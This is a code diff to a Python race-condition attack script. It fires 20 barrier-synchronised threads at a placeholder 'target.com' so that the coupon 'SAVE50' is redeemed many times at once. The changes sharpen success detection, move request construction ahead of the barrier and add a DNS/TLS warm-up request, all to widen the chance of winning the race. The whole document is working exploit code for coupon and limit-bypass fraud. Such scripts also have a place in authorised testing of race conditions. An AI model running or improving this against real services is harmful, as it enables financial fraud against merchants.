@@ -18,7 +18,7 @@ HOST    = "target.com"
 METHOD  = "POST"
 THREADS = 20
 
-# POST body (for GET targets, set DATA = None and encode params in TARGET url)
+# POST body (for GET targets, set METHOD = "GET" and DATA = None, encode params in TARGET url)
 DATA = urllib.parse.urlencode({
     "coupon": "SAVE50",
     "action": "redeem",
@@ -31,8 +31,12 @@ HEADERS = {
     "User-Agent": "Mozilla/5.0",
 }
 
-# String in response body that indicates success (race win)
+# String in response body that indicates success (race win).
+# WARNING: this MUST be success-only text — e.g. "redeemed" also matches the
+# rejection "already redeemed". Pick a string that appears ONLY on success.
 EXPECTED_WIN = "redeemed"
+# Optional: strings that disqualify a response even if EXPECTED_WIN matches
+EXPECTED_FAIL = ["already redeemed", "already used", "invalid"]
 # ─────────────────────────────────────────────────────────────────────────────
 
 results = []
@@ -41,14 +45,20 @@ gate = threading.Barrier(THREADS)  # all threads start at same instant
 
 
 def fire(i):
-    gate.wait()  # block until all threads are ready, then release simultaneously
+    # Build the Request BEFORE the barrier so release skew is only network
+    # setup, not object construction.
+    # NOTE: true last-byte synchronisation needs a single-packet tool like
+    # Burp Turbo Intruder — this script catches wide race windows only.
     req = urllib.request.Request(TARGET, data=DATA, headers=HEADERS, method=METHOD)
+    gate.wait()  # block until all threads are ready, then release simultaneously
     start = time.time()
     try:
         r = urllib.request.urlopen(req, timeout=15)
         body = r.read().decode(errors="replace")
         elapsed = time.time() - start
-        won = EXPECTED_WIN.lower() in body.lower()
+        lower = body.lower()
+        won = (EXPECTED_WIN.lower() in lower
+               and not any(f.lower() in lower for f in EXPECTED_FAIL))
         with lock:
             results.append({"thread": i, "status": r.status, "won": won,
                              "elapsed": f"{elapsed:.3f}s", "body": body[:100]})
@@ -65,6 +75,15 @@ def fire(i):
 def main():
     print(f"[*] Firing {THREADS} parallel requests at {TARGET}")
     print(f"[*] Win condition: response contains '{EXPECTED_WIN}'")
+    print()
+
+    # Warm-up request: pre-flight DNS/TLS so thread release skew is minimal
+    try:
+        warm = urllib.request.Request(TARGET, data=DATA, headers=HEADERS, method=METHOD)
+        urllib.request.urlopen(warm, timeout=15).read()
+        print("[*] Warm-up request OK (DNS/TLS pre-flight done)")
+    except Exception as e:
+        print(f"[*] Warm-up request failed ({e}) — continuing anyway")
     print()
 
     threads = [threading.Thread(target=fire, args=(i,)) for i in range(THREADS)]
